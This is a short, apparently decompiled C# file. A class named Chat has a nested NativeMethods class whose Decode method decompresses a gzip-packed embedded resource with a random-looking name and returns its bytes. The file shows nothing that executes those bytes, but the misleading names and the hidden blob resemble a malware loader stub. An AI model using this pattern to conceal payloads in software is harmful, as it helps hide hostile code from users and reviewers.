using System.IO;
using System.IO.Compression;
using WindowsFormsApp1.Properties;

namespace WindowsFormsApp1;

internal class Chat
{
	internal static class NativeMethods
	{
		internal static byte[] Decode()
		{
			using MemoryStream stream = new MemoryStream(Resources.Thxopsdajdo);
			using MemoryStream memoryStream = new MemoryStream();
			using BufferedStream bufferedStream = new BufferedStream(new GZipStream(stream, CompressionMode.Decompress));
			bufferedStream.CopyTo(memoryStream);
			return memoryStream.ToArray();
		}
	}
}
